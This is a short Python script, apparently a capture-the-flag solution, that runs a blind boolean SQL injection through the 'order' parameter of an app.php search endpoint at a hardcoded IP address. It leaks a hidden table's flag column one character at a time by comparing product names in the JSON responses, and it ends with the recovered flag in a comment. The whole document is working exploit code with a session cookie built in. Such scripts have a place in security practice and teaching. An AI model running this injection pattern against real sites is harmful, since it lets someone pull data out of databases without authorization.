import requests
import string
import json

cook = {"PHPSESSID":"0i1jgfqjv41b6vpfc2rt1rper0"}

fuzz = '''qwertyuiopasdfghjklzxcvbnm,<>?:"{}_+1234567890QWERTYUIOPASDFGHJKLZXCVBNM'''

for index in xrange(0,32):
	for x in fuzz:
		url="http://202.120.7.197/app.php?action=search&keyword=i&order=if((ascii(mid((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),%d,1))regexp(%d)),name,price)"%(index,ord(x))
		resp_json = requests.get(url,cookies=cook).text
		jsonobj = json.loads(resp_json)
		ret = jsonobj['goods'][0]['name']
		if 'Schrodinger' in ret:
			continue
		print x,
		
#flag{r4ce_c0nditi0n_i5_excited}
